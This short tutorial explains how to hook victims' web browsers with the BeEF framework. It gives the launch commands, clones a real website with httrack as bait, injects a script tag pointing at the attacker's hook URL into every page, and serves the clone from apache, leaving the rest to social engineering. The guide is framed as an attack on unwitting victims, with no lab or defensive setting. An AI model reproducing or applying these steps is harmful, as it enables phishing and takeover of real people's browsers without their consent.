How to hook a browser with beEF

Launch beEF (Either using bash script or commands)

cd beef
./beef
or
beef

Take note of the "Hook URL" that is running on your wlan0 interface, and the "UI URL".

Open a web browser, and paste the UI URL into it. This will take you to the beEF graphical interface.

Find a webpage (preferably only a few pages, not social media) that you want to use to bait the victim.

Use httrack to clone the website.

Open the index.html file in your html editor, and paste the following text anywhere in between two "<head>" or "<body>" tags:

<script src="[Hook URL]"></script>

Do the same for all other html files in the cloned website directory.

Copy all files in the cloned direccltory to /var/www/html

Start the apache2 server:

service apache2 start

You can access your hooked webpage by typing in your ip address. The rest of the process is up to you, and will require social engineering.
